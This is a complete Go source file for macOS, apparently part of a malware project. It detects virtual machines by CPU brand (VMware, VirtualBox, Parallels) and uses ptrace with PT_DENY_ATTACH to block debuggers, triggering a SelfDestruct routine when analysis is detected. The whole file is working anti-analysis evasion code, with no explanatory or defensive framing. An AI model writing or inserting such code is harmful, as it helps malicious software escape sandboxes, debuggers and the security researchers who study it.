//go:build darwin

package antianalysis

import (
	"strings"
	"syscall"

	"github.com/klauspost/cpuid/v2"
)

func AntiAnalysis() {
	if cpuid.CPU.VM() {
		brand := strings.ToLower(cpuid.CPU.BrandName)
		vmVendors := []string{"vmware", "virtualbox", "vbox", "parallels"}
		for _, vendor := range vmVendors {
			if strings.Contains(brand, vendor) {
				SelfDestruct()
			}
		}
	}

	ret, _, err := syscall.Syscall(
		26,          //SYS_PTRACE
		uintptr(31), //PT_DENY_ATTACH
		0, 0,
	)

	if ret != 0 && err != 0 {
		SelfDestruct()
	}
}
